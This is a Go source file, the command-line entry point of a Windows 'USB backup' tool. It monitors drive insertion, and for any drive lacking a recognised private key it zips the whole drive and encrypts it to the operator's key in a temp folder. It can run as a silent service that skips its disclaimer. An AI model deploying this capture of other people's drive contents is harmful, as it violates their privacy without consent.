// Command usbbackup 是常驻主程序。
//
// 用法：
//
//	usbbackup run [--allow-fixed] [--dry-run] [--poll-only] [--service]
//	usbbackup once --drive E: [--allow-fixed] [--dry-run]
//	usbbackup list [--all]
//	usbbackup probe --drive E:
//	usbbackup config-check
//	usbbackup install-service / uninstall-service / start / stop / status
//	usbbackup version
//
// 对应需求 F-101 ~ F-107、F-801 ~ F-809、F-D01 ~ F-D03。
package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"

	"github.com/immml/UsbBackUP/internal/backup"
	"github.com/immml/UsbBackUP/internal/cli"
	"github.com/immml/UsbBackUP/internal/config"
	"github.com/immml/UsbBackUP/internal/fsutil"
	"github.com/immml/UsbBackUP/internal/keyfile"
	"github.com/immml/UsbBackUP/internal/logx"
	"github.com/immml/UsbBackUP/internal/version"
	"github.com/immml/UsbBackUP/internal/winmon"
	"github.com/immml/UsbBackUP/internal/winsvc"
	"github.com/immml/UsbBackUP/internal/winvol"
)

const toolName = "usbbackup"

func main() {
	os.Exit(run(os.Args[1:], os.Stdin, os.Stdout, os.Stderr))
}

func run(args []string, stdin io.Reader, stdout, stderr io.Writer) int {
	if len(args) == 0 {
		printUsage(stdout)
		return cli.ExitUsage
	}
	sub, rest := args[0], args[1:]

	switch sub {
	case "version", "--version", "-v":
		fmt.Fprintln(stdout, version.MultiLine())
		return cli.ExitOK
	case "help", "--help", "-h":
		printUsage(stdout)
		return cli.ExitOK
	}

	cfgPath, skipConfirm := cli.ExtractGlobalFlags(args)

	// 会写数据的子命令需要确认；只读诊断子命令不打扰用户。
	switch sub {
	case "run", "once":
		switch {
		case hasArg(args, "--service"):
			// 服务模式：由 SCM 启动，既没有控制台也无法交互确认。
			// 这里必须静默通过——否则读不到 I AGREE 会立刻退出，
			// SCM 会报 1053「服务没有及时响应启动或控制请求」。
		case skipConfirm:
			cli.RenderNotice(stdout, toolName)
		default:
			cli.RenderBanner(stdout, toolName)
			if err := cli.ConfirmAgreement(stdin, stdout); err != nil {
				return cli.ExitNotAgreed
			}
		}
	}

	switch sub {
	case "run":
		return cmdRun(rest, cfgPath, stdout, stderr)
	case "once":
		return cmdOnce(rest, cfgPath, stdout, stderr)
	case "list":
		return cmdList(rest, stdout, stderr)
	case "probe":
		return cmdProbe(rest, cfgPath, stdout, stderr)
	case "config-check":
		return cmdConfigCheck(cfgPath, stdout, stderr)
	case "install-service", "uninstall-service", "start", "stop", "status":
		return cmdService(sub, stdout, stderr)
	default:
		fmt.Fprintf(stderr, "未知子命令 %q\n\n", sub)
		printUsage(stderr)
		return cli.ExitUsage
	}
}

func printUsage(w io.Writer) {
	cli.PrintHelp(w, "usbbackup —— Windows 专用 U 盘自动备份与加密工具", []string{
		"用法：",
		"  usbbackup run [选项]                    前台常驻运行（监控 U 盘插入）",
		"  usbbackup once --drive E: [选项]        对指定盘符执行一次作业",
		"  usbbackup list [--all]                  列出可移动卷及其容量",
		"  usbbackup probe --drive E:              只读诊断（不写任何数据）",
		"  usbbackup config-check                  校验配置与运行环境",
		"  usbbackup install-service               注册为 Windows 服务（需管理员）",
		"  usbbackup uninstall-service             删除服务（需管理员）",
		"  usbbackup start | stop | status         控制已注册的服务",
		"  usbbackup version                       显示版本信息",
		"",
		"全局开关（可放在任意位置）：",
		"  --config string   配置文件路径",
		"  --yes             跳过免责声明确认（自动化用）",
		"",
		"run / once 选项：",
		"  --dry-run         只做检测与门控判定，不写入任何数据",
		"  --poll-only       强制仅使用轮询（排障用；默认事件驱动）",
		"  --allow-fixed     允许对固定磁盘执行作业",
		"                    【仅供验证与排障】生产环境不要开启",
		"  --overwrite       回写时覆盖目标同名文件（默认跳过）",
		"  --verify-hash     回写后按 SHA-256 逐文件校验",
		"  --service         以 Windows 服务方式运行（由 SCM 调用）",
		"  --simulate-arrival E:",
		"                    注入一次模拟的卷到达事件（仅用于验证链路，可重复）",
		"",
		"行为概述：",
		"  检测到介质持有私钥 → 把本地备份文件夹内容复制到该介质 \\backup\\ 目录；",
		"  未检测到私钥       → 已占用容量 ≤ 阈值则整盘打包并混合加密到 %TEMP%\\backup\\，",
		"                       超过阈值则直接跳过。",
		"  两个分支都不会删除或改写源介质上的任何文件。",
		"",
		"提示：首次使用请先跑 `usbbackup probe --drive <盘符>` 确认判定结果符合预期。",
	})
}

// ---- 运行参数 ----

type runFlags struct {
	drive     string
	dryRun    bool
	pollOnly  bool
	allowFix  bool
	overwrite bool
	verifyHsh bool
	service   bool
	// simArrival 是验证辅助开关：在没有物理介质时注入一次"卷到达"事件，
	// 用来跑通"监控 → 作业队列 → 流水线"的完整链路。生产不要使用。
	simArrival stringList
}

// stringList 支持重复出现的字符串选项。
type stringList []string

func (s *stringList) String() string { return strings.Join(*s, ",") }
func (s *stringList) Set(v string) error {
	*s = append(*s, v)
	return nil
}

func parseRunFlags(args []string, wantDrive bool, stderr io.Writer) (runFlags, string, int) {
	var rf runFlags
	fs := flag.NewFlagSet("run", flag.ContinueOnError)
	fs.SetOutput(stderr)
	if wantDrive {
		fs.StringVar(&rf.drive, "drive", "", "盘符，如 E:")
	}
	fs.BoolVar(&rf.dryRun, "dry-run", false, "不写入任何数据")
	fs.BoolVar(&rf.pollOnly, "poll-only", false, "仅使用轮询")
	fs.BoolVar(&rf.allowFix, "allow-fixed", false, "允许对固定磁盘执行（仅供验证）")
	fs.BoolVar(&rf.overwrite, "overwrite", false, "覆盖同名文件")
	fs.BoolVar(&rf.verifyHsh, "verify-hash", false, "复制后按 SHA-256 校验")
	fs.BoolVar(&rf.service, "service", false, "以 Windows 服务方式运行")
	fs.Var(&rf.simArrival, "simulate-arrival", "注入一次模拟的卷到达事件（验证用，可重复）")
	if err := cli.ParseArgs(fs, args); err != nil {
		return rf, "", cli.ExitUsage
	}
	return rf, "", cli.ExitOK
}

// buildDeps 组装流水线依赖：配置、日志、判定器、公钥指纹。
func buildDeps(cfg *config.Config, logger *slog.Logger, rf runFlags) (backup.Deps, error) {
	var fp string
	if cfg.PublicKeyPath != "" {
		if got, err := loadPubFingerprint(cfg.PublicKeyPath); err == nil {
			fp = got
		}
	}
	m, err := keyfile.NewMatcher(cfg.Detect.ExtraNamePatterns, cfg.Detect.ExtraContentMarkers, cfg.Detect.MaxHeadersBytes)
	if err != nil {
		return backup.Deps{}, fmt.Errorf("构造私钥判定器失败: %w", err)
	}
	return backup.Deps{
		Cfg:                cfg,
		Log:                logger,
		Matcher:            m,
		AllowedFingerprint: fp,
		AllowFixed:         rf.allowFix,
		DryRun:             rf.dryRun,
		CopyOverwrite:      rf.overwrite,
		CopyVerifyHash:     rf.verifyHsh,
	}, nil
}

// ---- run ----

func cmdRun(args []string, cfgPath string, stdout, stderr io.Writer) int {
	rf, _, code := parseRunFlags(args, false, stderr)
	if code != cli.ExitOK {
		return code
	}

	cfg, path, code := loadConfig(cfgPath, stderr)
	if cfg == nil {
		return code
	}

	// 服务模式下日志不写控制台（服务没有控制台），只用文件。
	useConsole := !rf.service
	logHandle, err := logx.New(logx.Options{
		Level:      cfg.Log.Level,
		File:       config.ExpandPath(cfg.Log.File),
		MaxSizeMB:  cfg.Log.MaxSizeMB,
		MaxBackups: cfg.Log.MaxBackups,
		Console:    useConsole,
	})
	if err != nil {
		fmt.Fprintf(stderr, "初始化日志失败：%v\n", err)
		return cli.ExitRuntime
	}
	defer logHandle.Close()
	logger := logHandle.Logger

	if rf.service {
		logger.Info("以 Windows 服务方式启动")
		if err := winsvc.RunAsService(func(ctx context.Context) error {
			return serve(ctx, cfg, logger, rf, stdout, stderr)
		}); err != nil {
			logger.Error("服务运行失败", "err", err)
			return cli.ExitRuntime
		}
		return cli.ExitOK
	}

	// 单实例互斥（F-808）：避免重复挂载监控。
	release, err := winsvc.AcquireSingleInstance(version.AppName)
	if err != nil {
		if errors.Is(err, winsvc.ErrAlreadyRunning) {
			fmt.Fprintf(stderr, "错误：%v\n", err)
			return cli.ExitRuntime
		}
		fmt.Fprintf(stderr, "警告：单实例互斥体创建失败（%v），继续运行\n", err)
	} else {
		defer release()
	}

	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
	defer stop()

	fmt.Fprintf(stdout, "已启动，配置文件：%s\n", path)
	for _, line := range cfg.Summary() {
		fmt.Fprintf(stdout, "  %s\n", line)
	}
	fmt.Fprintln(stdout, "按 Ctrl+C 退出。")

	if err := serve(ctx, cfg, logger, rf, stdout, stderr); err != nil {
		logger.Error("运行结束（异常）", "err", err)
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitRuntime
	}
	fmt.Fprintln(stdout, "已退出。")
	return cli.ExitOK
}

// serve 是 run 与 service 共用的监控主体。
func serve(ctx context.Context, cfg *config.Config, logger *slog.Logger, rf runFlags, stdout, stderr io.Writer) error {
	// 启动时清理上次中断留下的半成品（F-809）。
	if n, err := backup.CleanupPartials(cfg.OutputDir); err == nil && n > 0 {
		logger.Info("已清理上次遗留的半成品", "count", n)
	}

	deps, err := buildDeps(cfg, logger, rf)
	if err != nil {
		return err
	}

	// 作业串行队列（F-104）：同一时刻只处理一个介质，避免 IO 抖动。
	type job struct {
		root string
		at   time.Time
	}
	jobs := make(chan job, 16)
	pending := map[string]bool{}
	var mu sync.Mutex

	var workerWG sync.WaitGroup
	workerWG.Add(1)
	go func() {
		defer workerWG.Done()
		for j := range jobs {
			logger.Info("开始作业", "root", j.root)
			res, err := backup.Run(ctx, deps, j.root)
			if err != nil {
				logger.Error("作业失败", "root", j.root, "err", err)
			} else {
				logger.Info("作业完成",
					"root", j.root,
					"branch", string(res.Branch),
					"ok", res.OK,
					"duration", res.Duration.String())
			}
			mu.Lock()
			delete(pending, j.root)
			mu.Unlock()
		}
	}()

	enqueue := func(ev winmon.Event) {
		if ev.Kind != winmon.EventArrival {
			return
		}
		mu.Lock()
		if pending[ev.Root] {
			mu.Unlock()
			return
		}
		pending[ev.Root] = true
		mu.Unlock()

		select {
		case jobs <- job{root: ev.Root, at: ev.At}:
		default:
			mu.Lock()
			delete(pending, ev.Root)
			mu.Unlock()
			logger.Warn("作业队列已满，丢弃该事件", "root", ev.Root)
		}
	}

	// 验证辅助：无物理介质时注入一次"卷到达"，跑通完整链路。
	if len(rf.simArrival) > 0 {
		logger.Warn("已启用 --simulate-arrival：将注入模拟事件，仅用于验证")
		go func() {
			time.Sleep(400 * time.Millisecond)
			for _, d := range rf.simArrival {
				root, err := winvol.NormalizeRoot(d)
				if err != nil {
					logger.Warn("模拟事件盘符非法，已忽略", "drive", d, "err", err)
					continue
				}
				logger.Info("注入模拟卷到达事件", "root", root)
				enqueue(winmon.Event{Root: root, Kind: winmon.EventArrival, At: time.Now(), Source: "simulated"})
			}
		}()
	}

	mon := winmon.New(winmon.Options{
		PollInterval:          time.Duration(cfg.Monitor.PollIntervalSec) * time.Second,
		Debounce:              time.Duration(cfg.Monitor.DebounceSec) * time.Second,
		PollOnly:              rf.pollOnly || cfg.Monitor.PollOnly,
		ProcessMountedOnStart: cfg.Monitor.ProcessMountedOnStart,
		Logger:                logger,
	})

	runErr := mon.Run(ctx, enqueue)
	close(jobs)
	workerWG.Wait()
	return runErr
}

// ---- once ----

func cmdOnce(args []string, cfgPath string, stdout, stderr io.Writer) int {
	rf, _, code := parseRunFlags(args, true, stderr)
	if code != cli.ExitOK {
		return code
	}
	if strings.TrimSpace(rf.drive) == "" {
		fmt.Fprintln(stderr, "错误：必须指定 --drive，例如 --drive E:")
		return cli.ExitUsage
	}
	root, err := winvol.NormalizeRoot(rf.drive)
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitUsage
	}

	cfg, _, code := loadConfig(cfgPath, stderr)
	if cfg == nil {
		return code
	}
	logHandle, err := logx.New(logx.Options{
		Level: cfg.Log.Level, MaxSizeMB: cfg.Log.MaxSizeMB,
		MaxBackups: cfg.Log.MaxBackups, Console: true,
	})
	if err != nil {
		fmt.Fprintf(stderr, "初始化日志失败：%v\n", err)
		return cli.ExitRuntime
	}
	defer logHandle.Close()

	deps, err := buildDeps(cfg, logHandle.Logger, rf)
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitRuntime
	}
	if rf.dryRun {
		fmt.Fprintln(stdout, "[dry-run] 不会写入任何数据。")
	}
	if rf.allowFix {
		fmt.Fprintln(stdout, "[警告] 已启用 --allow-fixed：允许对固定磁盘执行作业，仅供验证使用。")
	}

	res, err := backup.Run(context.Background(), deps, root)
	if err != nil {
		fmt.Fprintf(stderr, "作业失败：%v\n", err)
		return cli.ExitRuntime
	}

	fmt.Fprintf(stdout, "盘符            : %s\n", res.Root)
	fmt.Fprintf(stdout, "卷标 / 文件系统 : %s / %s\n",
		winvol.LabelOrFallback(res.Volume), emptyDash(res.Volume.FileSystem))
	fmt.Fprintf(stdout, "已占用 / 阈值   : %s / %s\n",
		fsutil.HumanBytes(res.Volume.UsedBytes), fsutil.HumanBytes(cfg.Gate.UsedThresholdBytes))
	fmt.Fprintf(stdout, "私钥存在性      : %v（命中 %d 次，类型 %v）\n",
		res.Authorized, res.Detect.HitCount, res.Detect.Kinds)
	fmt.Fprintf(stdout, "分支            : %s\n", res.Branch)
	if res.SkipReason != "" {
		fmt.Fprintf(stdout, "跳过原因        : %s\n", res.SkipReason)
	}
	if res.Copy != nil {
		fmt.Fprintf(stdout, "回写            : 复制 %d / 跳过 %d / 失败 %d，共 %s\n",
			res.Copy.FilesCopied, res.Copy.FilesSkipped, res.Copy.FilesFailed,
			fsutil.HumanBytes(res.Copy.BytesCopied))
		if res.Copy.ManifestWritten {
			fmt.Fprintln(stdout, "                  已写出回写清单 .usbbackup-manifest.json")
		}
		if res.Copy.VerifyFailures > 0 {
			fmt.Fprintf(stdout, "                  校验不一致 %d 个文件\n", res.Copy.VerifyFailures)
		}
	}
	if res.ProductPath != "" {
		fmt.Fprintf(stdout, "产物            : %s\n", res.ProductPath)
		fmt.Fprintf(stdout, "打包/加密       : %d 文件，原始 %s → zip %s → 密文 %s\n",
			res.Zip.Files, fsutil.HumanBytes(res.Zip.RawBytes),
			fsutil.HumanBytes(res.Encrypt.PlainBytes), fsutil.HumanBytes(res.Encrypt.CipherBytes))
		fmt.Fprintf(stdout, "公钥指纹        : %s\n", res.Encrypt.Header.FingerprintHex())
	}
	fmt.Fprintf(stdout, "耗时            : %s\n", res.Duration)
	fmt.Fprintf(stdout, "结果            : %s\n", okText(res.OK))

	if !res.OK {
		return cli.ExitPartial
	}
	return cli.ExitOK
}

// ---- 只读诊断 ----

func cmdList(args []string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("list", flag.ContinueOnError)
	fs.SetOutput(stderr)
	var showAll bool
	fs.BoolVar(&showAll, "all", false, "显示全部盘符（含固定磁盘、光驱等）")
	if err := cli.ParseArgs(fs, args); err != nil {
		return cli.ExitUsage
	}

	roots, err := winvol.Roots()
	if err != nil {
		fmt.Fprintf(stderr, "枚举盘符失败：%v\n", err)
		return cli.ExitRuntime
	}
	if len(roots) == 0 {
		fmt.Fprintln(stdout, "未检测到任何盘符。")
		return cli.ExitOK
	}

	const (
		wDrive, wType, wReady, wFS = 7, 12, 6, 10
		wTotal, wUsed, wFree       = 12, 12, 12
	)
	line := func(drive, typ, ready, fsname, total, used, free, label string) {
		fmt.Fprintf(stdout, "%s %s %s %s %s %s %s  %s\n",
			padRight(drive, wDrive), padRight(typ, wType), padRight(ready, wReady),
			padRight(fsname, wFS), padLeft(total, wTotal), padLeft(used, wUsed),
			padLeft(free, wFree), label)
	}
	line("盘符", "类型", "就绪", "文件系统", "总容量", "已占用", "剩余", "卷标")

	shown := 0
	for _, r := range roots {
		v, qerr := winvol.Query(r)
		if !v.Removable && !showAll {
			continue
		}
		if v.Removable {
			shown++
		}
		line(v.Root, winvol.DriveTypeName(v.DriveType), yesNo(v.Ready),
			emptyDash(v.FileSystem), fsutil.HumanBytes(v.TotalBytes),
			fsutil.HumanBytes(v.UsedBytes), fsutil.HumanBytes(v.FreeBytes), emptyDash(v.Label))
		if qerr != nil && v.Removable {
			fmt.Fprintf(stdout, "  注：%v\n", qerr)
		}
	}
	if shown == 0 && !showAll {
		fmt.Fprintln(stdout, "\n当前没有可移动卷。插好 U 盘后重试，或用 `list --all` 查看全部盘符。")
	}
	return cli.ExitOK
}

func cmdProbe(args []string, cfgPath string, stdout, stderr io.Writer) int {
	fs := flag.NewFlagSet("probe", flag.ContinueOnError)
	fs.SetOutput(stderr)
	var drive string
	fs.StringVar(&drive, "drive", "", "盘符，如 E:（必填）")
	if err := cli.ParseArgs(fs, args); err != nil {
		return cli.ExitUsage
	}
	if drive == "" {
		fmt.Fprintln(stderr, "错误：必须指定 --drive，例如 --drive E:")
		return cli.ExitUsage
	}
	cfg, _, code := loadConfig(cfgPath, stderr)
	if cfg == nil {
		return code
	}
	root, err := winvol.NormalizeRoot(drive)
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitUsage
	}

	fmt.Fprintln(stdout, "只读诊断（本命令不写任何数据、不修改任何文件）：")
	fmt.Fprintf(stdout, "  目标卷根        : %s\n", root)

	v, qerr := winvol.Query(root)
	fmt.Fprintf(stdout, "  卷类型          : %s\n", winvol.DriveTypeName(v.DriveType))
	if !v.Removable {
		fmt.Fprintln(stdout, "  判定            : 非可移动卷 → 生产运行时会直接跳过（F-301）")
		if qerr != nil {
			fmt.Fprintf(stdout, "  查询补充        : %v\n", qerr)
		}
		return cli.ExitPartial
	}
	if !v.Ready {
		fmt.Fprintf(stdout, "  就绪            : 否（%v）\n", qerr)
		fmt.Fprintln(stdout, "  判定            : 卷未就绪 → 生产运行时会跳过（F-305）")
		return cli.ExitPartial
	}
	fmt.Fprintf(stdout, "  卷标 / 文件系统 : %s / %s\n",
		winvol.LabelOrFallback(v), emptyDash(v.FileSystem))
	fmt.Fprintf(stdout, "  卷序列号        : %08X\n", v.SerialNumber)
	fmt.Fprintf(stdout, "  总容量/已占用/剩余: %s / %s / %s\n",
		fsutil.HumanBytes(v.TotalBytes), fsutil.HumanBytes(v.UsedBytes), fsutil.HumanBytes(v.FreeBytes))
	fmt.Fprintf(stdout, "  产物命名(分支B) : %s\n", backup.ProductName(v))

	m, err := keyfile.NewMatcher(cfg.Detect.ExtraNamePatterns, cfg.Detect.ExtraContentMarkers, cfg.Detect.MaxHeadersBytes)
	if err != nil {
		fmt.Fprintf(stderr, "错误：构造检测器失败：%v\n", err)
		return cli.ExitRuntime
	}
	fp := ""
	if cfg.PublicKeyPath != "" {
		if got, err := loadPubFingerprint(cfg.PublicKeyPath); err == nil {
			fp = got
		}
	}
	res, err := keyfile.Scan(context.Background(), keyfile.Options{
		Root: root, Matcher: m, Detect: cfg.Detect, AllowedFingerprint: fp,
	})
	if err != nil {
		fmt.Fprintf(stderr, "检测失败：%v\n", err)
		return cli.ExitRuntime
	}
	// 只输出布尔值与计数，不输出命中文件名（G-02）。
	fmt.Fprintf(stdout, "  私钥存在性      : %v（命中 %d 次，类型 %v）\n",
		res.Authorized, res.HitCount, res.Kinds)
	fmt.Fprintf(stdout, "  检测开销        : 检查 %d 个文件 / %d 个目录，读取 %s，耗时 %s%s\n",
		res.FilesScanned, res.DirsScanned, fsutil.HumanBytes(res.BytesRead), res.Duration,
		truncatedNote(res.Truncated))

	if res.Authorized {
		target, cerr := copierTarget(cfg, root)
		if cerr != nil {
			fmt.Fprintf(stdout, "  将执行          : 分支 A（回写本地备份）— 前置校验未通过：%v\n", cerr)
			return cli.ExitPartial
		}
		fmt.Fprintf(stdout, "  将执行          : 分支 A — 把 %s 复制到 %s\n",
			config.ExpandPath(cfg.BackupSourceDir), target)
		fmt.Fprintln(stdout, "                    只在该目录内写入，不删除源盘任何文件。")
	} else {
		policy := winvol.EvaluateGate(v, cfg.Gate.UsedThresholdBytes, cfg.Gate.MaxTotalBytes)
		if policy.Proceed {
			fmt.Fprintf(stdout, "  将执行          : 分支 B — 整盘打包并混合加密到 %s\\%s\n",
				config.ExpandPath(cfg.OutputDir), backup.ProductName(v))
			fmt.Fprintln(stdout, "                    源盘只读，不删除源文件。")
		} else {
			fmt.Fprintf(stdout, "  将执行          : 跳过（%s）\n", policy.Reason)
		}
	}
	return cli.ExitOK
}

func cmdConfigCheck(cfgPath string, stdout, stderr io.Writer) int {
	cfg, path, code := loadConfig(cfgPath, stderr)
	if cfg == nil {
		return code
	}
	fmt.Fprintf(stdout, "配置文件：%s\n\n", path)
	fmt.Fprintln(stdout, "生效配置：")
	for _, line := range cfg.Summary() {
		fmt.Fprintf(stdout, "  %s\n", line)
	}

	problems := 0
	fmt.Fprintln(stdout, "\n检查项：")
	report := func(name string, ok bool, detail string) {
		mark := "OK  "
		if !ok {
			mark = "FAIL"
			problems++
		}
		fmt.Fprintf(stdout, "  [%s] %s %s\n", mark, name, detail)
	}

	src := config.ExpandPath(cfg.BackupSourceDir)
	if st, err := os.Stat(fsutil.LongPath(src)); err == nil && st.IsDir() {
		report("备份源目录存在", true, src)
	} else {
		report("备份源目录存在", false, fmt.Sprintf("%s（授权分支将无数据可回写）", src))
	}

	out := config.ExpandPath(cfg.OutputDir)
	if err := os.MkdirAll(out, 0o755); err != nil {
		report("产物输出目录可写", false, fmt.Sprintf("%s（%v）", out, err))
	} else if f, err := os.CreateTemp(out, ".usbbackup-writecheck-*"); err != nil {
		report("产物输出目录可写", false, fmt.Sprintf("%s（%v）", out, err))
	} else {
		name := f.Name()
		_ = f.Close()
		_ = os.Remove(name)
		report("产物输出目录可写", true, out)
	}

	pubPath := config.ExpandPath(cfg.PublicKeyPath)
	if _, err := keystoreLoadPub(pubPath); err == nil {
		report("公钥可加载", true, pubPath)
	} else {
		report("公钥可加载", false, fmt.Sprintf("%s（%v）", pubPath, err))
	}

	audit := config.ExpandPath(cfg.AuditFile)
	if err := os.MkdirAll(dirOf(audit), 0o755); err == nil {
		report("审计目录可写", true, audit)
	} else {
		report("审计目录可写", false, fmt.Sprintf("%s（%v）", audit, err))
	}

	// 扫描源与产物目录必须不在同一卷的包含关系里，否则会递归套娃（G-08）。
	if err := archiveCheckSourceGuard(src, out); err != nil {
		report("源守卫（防递归套娃）", false, err.Error())
	} else {
		report("源守卫（防递归套娃）", true, "输出目录不在扫描源之内")
	}

	if problems > 0 {
		fmt.Fprintf(stderr, "\n共 %d 项检查未通过。\n", problems)
		return cli.ExitPartial
	}
	fmt.Fprintln(stdout, "\n全部检查通过。")
	return cli.ExitOK
}

func cmdService(sub string, stdout, stderr io.Writer) int {
	var err error
	switch sub {
	case "install-service":
		err = winsvc.Install("")
		if err == nil {
			fmt.Fprintln(stdout, "服务已注册为 usbbackup（启动类型：手动）。")
			fmt.Fprintln(stdout, "启动：usbbackup start     删除：usbbackup uninstall-service")
		}
	case "uninstall-service":
		err = winsvc.Uninstall()
		if err == nil {
			fmt.Fprintln(stdout, "服务已删除。")
		}
	case "start":
		err = winsvc.Start()
		if err == nil {
			fmt.Fprintln(stdout, "已发出启动指令。用 `usbbackup status` 查看状态。")
		}
	case "stop":
		err = winsvc.Stop()
		if err == nil {
			fmt.Fprintln(stdout, "已发出停止指令。")
		}
	case "status":
		var out string
		out, err = winsvc.Status()
		if out != "" {
			fmt.Fprintln(stdout, out)
		}
	}
	if err != nil {
		fmt.Fprintf(stderr, "错误：%v\n", err)
		return cli.ExitRuntime
	}
	return cli.ExitOK
}

// ---- 小工具 ----

// hasArg 判断参数列表中是否出现某个开关（只用于少数需要在解析前决策的场景）。
func hasArg(args []string, name string) bool {
	for _, a := range args {
		if a == name {
			return true
		}
	}
	return false
}

func emptyDash(s string) string {
	if s == "" {
		return "-"
	}
	return s
}

func yesNo(b bool) string {
	if b {
		return "是"
	}
	return "否"
}

func okText(ok bool) string {
	if ok {
		return "成功"
	}
	return "部分失败（详见上方统计与审计日志）"
}

func truncatedNote(t bool) string {
	if t {
		return "（已达扫描上限，结果可能不完整）"
	}
	return ""
}

func dirOf(p string) string {
	for i := len(p) - 1; i >= 0; i-- {
		if p[i] == '\\' || p[i] == '/' {
			if i == 0 {
				return p[:1]
			}
			return p[:i]
		}
	}
	return "."
}

// padRight / padLeft 按**显示宽度**补齐（CJK 字符占两列）。
// 直接用 fmt 的 %-Ns 会按字符数计算，中文列必然错位。
func padRight(s string, width int) string {
	w := dispWidth(s)
	if w >= width {
		return s
	}
	return s + strings.Repeat(" ", width-w)
}

func padLeft(s string, width int) string {
	w := dispWidth(s)
	if w >= width {
		return s
	}
	return strings.Repeat(" ", width-w) + s
}

func dispWidth(s string) int {
	n := 0
	for _, r := range s {
		if isWideRune(r) {
			n += 2
		} else {
			n++
		}
	}
	return n
}

// isWideRune 判断是否为双宽字符（East Asian Wide / Fullwidth）。
func isWideRune(r rune) bool {
	switch {
	case r < 0x1100:
		return false
	case r >= 0x1100 && r <= 0x115F,
		r >= 0x2E80 && r <= 0x303E,
		r >= 0x3041 && r <= 0x33FF,
		r >= 0x3400 && r <= 0x4DBF,
		r >= 0x4E00 && r <= 0x9FFF,
		r >= 0xA000 && r <= 0xA4CF,
		r >= 0xAC00 && r <= 0xD7A3,
		r >= 0xF900 && r <= 0xFAFF,
		r >= 0xFE30 && r <= 0xFE6F,
		r >= 0xFF00 && r <= 0xFF60,
		r >= 0xFFE0 && r <= 0xFFE6,
		r >= 0x20000 && r <= 0x3FFFD:
		return true
	}
	return false
}
